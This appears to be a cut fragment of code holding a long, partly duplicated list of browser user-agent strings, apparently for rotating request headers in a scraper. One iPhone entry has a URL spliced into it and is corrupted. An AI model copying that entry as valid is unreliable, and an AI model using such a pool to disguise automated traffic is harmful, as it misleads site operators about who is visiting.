     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
     'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
     'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
     'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
     'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
     'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
     'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
     'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
     'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
     'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
     'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
     'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
     'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
     'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
     'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
     'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
     'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0', 'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN', 'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
     "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
	 "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
	 "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
	 "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
	 "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
	 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
	 "Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5', 'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20', 'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a', 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2', 'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
     'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2', 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0', 'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
     'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
     'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
     'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
     'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
     'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
     'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
     'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
     'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
     'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
     'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
     'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
     'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
     'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
     'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
     'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
